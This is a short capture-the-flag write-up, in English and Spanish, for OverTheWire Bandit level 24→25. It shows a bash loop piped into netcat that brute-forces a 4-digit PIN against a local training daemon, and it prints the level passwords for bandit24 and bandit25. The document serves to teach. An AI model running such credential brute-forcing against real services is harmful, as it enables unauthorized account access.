# Bandit Level 24 → Level 25

## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
## Datos de acceso al nivel
```
bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
## Solución
```bash
bandit24@bandit:~$ nc -v localhost 30002
Connection to localhost (127.0.0.1) 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
bandit24@bandit:~$ for i in {0000..9999}; do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting.
```
## Notas adicionales
Primero nos conectamos al puerto 30002 con netcat, nos pide la contraseña de nivel anterior y una clave de 4 dígitos, por ello necesitamos un script, que genere esta clave, lo hacemos con un for desde el 0000 hasta 9999, luego le decimos que ingrese en cada for la contraseña junto con cada clave, se conecta con nc e ignora todos aquellos mensajes que empiezan con Wrong, a través de grep -v.
## Referencias
